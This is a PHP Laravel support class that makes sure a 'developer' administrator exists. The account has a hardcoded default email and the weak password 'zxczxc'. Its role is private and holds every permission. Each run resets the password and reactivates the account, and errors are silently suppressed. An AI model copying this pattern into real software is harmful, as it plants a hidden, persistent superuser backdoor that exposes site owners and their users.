<?php

namespace App\Support;

use App\Models\Admin;
use App\Models\Permission as AppPermission;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Schema;
use Spatie\Permission\Models\Permission;
use Spatie\Permission\Models\Role;

class DefaultDeveloperManager
{
    public static function ensure(): ?Admin
    {
        try {
            if (!Schema::hasTable('admins') || !Schema::hasTable('roles') || !Schema::hasTable('permissions')) {
                return null;
            }

            static::bootstrapMenusAndPermissionsIfMissing();

            $email = trim((string) env('SINGLE_DEV_EMAIL', 'toamedbd@gmail.com'));
            $password = (string) env('SINGLE_DEV_PASSWORD', 'zxczxc');
            $phone = trim((string) env('SINGLE_DEV_PHONE', '01700000000'));
            $firstName = trim((string) env('SINGLE_DEV_FIRST_NAME', 'Toamed'));
            $lastName = trim((string) env('SINGLE_DEV_LAST_NAME', 'Developer'));

            if ($email === '') {
                return null;
            }

            $devRole = Role::query()->firstOrCreate(
                ['name' => 'developer', 'guard_name' => 'admin'],
                ['created_at' => now(), 'updated_at' => now()]
            );

            try {
                $devRole->is_private = true;
                $devRole->save();
            } catch (\Throwable $_) {
                // ignore privacy save failures
            }

            $allPermissionNames = Permission::query()
                ->where('guard_name', 'admin')
                ->pluck('name')
                ->toArray();

            // Some installations seed permissions through App\Models\Permission.
            // Merge both sources so developer gets every permission by default.
            try {
                $appPermissionNames = AppPermission::query()
                    ->where(function ($q) {
                        $q->where('guard_name', 'admin')->orWhereNull('guard_name')->orWhere('guard_name', '');
                    })
                    ->pluck('name')
                    ->toArray();

                if (!empty($appPermissionNames)) {
                    $allPermissionNames = array_values(array_unique(array_merge($allPermissionNames, $appPermissionNames)));
                }
            } catch (\Throwable $_) {
                // ignore app-permission source failures
            }

            if (!empty($allPermissionNames)) {
                try {
                    $devRole->syncPermissions($allPermissionNames);
                } catch (\Throwable $_) {
                    // ignore permission sync failures
                }
            }

            $admin = Admin::query()->where('email', $email)->first();

            if (!$admin) {
                $admin = Admin::query()->create([
                    'first_name' => $firstName,
                    'last_name' => $lastName,
                    'email' => $email,
                    'phone' => $phone,
                    'password' => $password,
                    'role_id' => $devRole->id,
                    'status' => 'Active',
                ]);
            } else {
                $admin->first_name = $firstName !== '' ? $firstName : ($admin->first_name ?? 'Toamed');
                $admin->last_name = $lastName !== '' ? $lastName : ($admin->last_name ?? 'Developer');
                $admin->phone = $phone !== '' ? $phone : ($admin->phone ?? '');
                $admin->status = 'Active';
                $admin->role_id = $devRole->id;
                $admin->password = $password;
                $admin->save();
            }

            try {
                $admin->syncRoles([$devRole->name]);
                $admin->syncPermissions([]);
            } catch (\Throwable $_) {
                // ignore role sync failures
            }

            // Defensive fallback: ensure role holds the latest full permission set.
            if (!empty($allPermissionNames)) {
                try {
                    $devRole->syncPermissions($allPermissionNames);
                    $admin->syncRoles([$devRole->name]);
                    $admin->load('roles', 'permissions');
                } catch (\Throwable $_) {
                    // ignore
                }
            }

            try {
                if (Schema::hasTable('modules') && Schema::hasTable('admin_module') && method_exists($admin, 'modules')) {
                    $moduleIds = DB::table('modules')->pluck('id')->toArray();
                    if (!empty($moduleIds)) {
                        $admin->modules()->syncWithoutDetaching($moduleIds);
                    }
                }
            } catch (\Throwable $_) {
                // ignore module sync failures
            }

            try {
                app(\Spatie\Permission\PermissionRegistrar::class)->forgetCachedPermissions();
            } catch (\Throwable $_) {
                // ignore cache clear failures
            }

            return $admin->fresh();
        } catch (\Throwable $_) {
            return null;
        }
    }

    public static function isDeveloper(?Admin $admin): bool
    {
        if (!$admin) {
            return false;
        }

        try {
            if (method_exists($admin, 'hasRole') && $admin->hasRole('developer')) {
                return true;
            }
        } catch (\Throwable $_) {
            // ignore hasRole failures
        }

        try {
            $roleName = strtolower(trim((string) optional($admin->role)->name));
            return $roleName === 'developer';
        } catch (\Throwable $_) {
            return false;
        }
    }

    private static function bootstrapMenusAndPermissionsIfMissing(): void
    {
        try {
            if (!Schema::hasTable('menus') || !Schema::hasTable('permissions')) {
                return;
            }

            $menuCount = (int) DB::table('menus')->count();
            $permissionCount = (int) DB::table('permissions')->where('guard_name', 'admin')->count();

            if ($menuCount === 0) {
                foreach ([
                    \Database\Seeders\MenuSeeder::class,
                    \Database\Seeders\SettingsMenuSyncSeeder::class,
                    \Database\Seeders\QuickAccessMenuPermissionSyncSeeder::class,
                    \Database\Seeders\StoreManagementMenuSeeder::class,
                    \Database\Seeders\SalarySheetMenuSeeder::class,
                    \Database\Seeders\MenuDeduplicateSeeder::class,
                ] as $seederClass) {
                    try {
                        if (class_exists($seederClass)) {
                            Artisan::call('db:seed', ['--class' => $seederClass, '--force' => true]);
                        }
                    } catch (\Throwable $_) {
                        // ignore individual seeder errors
                    }
                }
            }

            if ($permissionCount === 0) {
                foreach ([
                    \Database\Seeders\PermissionSeeder::class,
                    \Database\Seeders\PermissionFixSeeder::class,
                    \Database\Seeders\MenuPermissionCoverageSeeder::class,
                    \Database\Seeders\ReportManagementPermissionSeeder::class,
                    \Database\Seeders\DutyRosterPermissionSeeder::class,
                    \Database\Seeders\SalarySheetPermissionSeeder::class,
                ] as $seederClass) {
                    try {
                        if (class_exists($seederClass)) {
                            Artisan::call('db:seed', ['--class' => $seederClass, '--force' => true]);
                        }
                    } catch (\Throwable $_) {
                        // ignore individual seeder errors
                    }
                }
            }

            // Always ensure Salary Sheet menu exists and apply final sidebar normalization.
            try {
                if (class_exists(\Database\Seeders\SalarySheetMenuSeeder::class)) {
                    Artisan::call('db:seed', ['--class' => \Database\Seeders\SalarySheetMenuSeeder::class, '--force' => true]);
                }
            } catch (\Throwable $_) {
                // ignore salary-sheet menu sync failures
            }

            try {
                if (class_exists(\Database\Seeders\SidebarPermissionStabilitySeeder::class)) {
                    Artisan::call('db:seed', ['--class' => \Database\Seeders\SidebarPermissionStabilitySeeder::class, '--force' => true]);
                }
            } catch (\Throwable $_) {
                // ignore sidebar-stability sync failures
            }
        } catch (\Throwable $_) {
            // ignore bootstrap failures
        }
    }
}
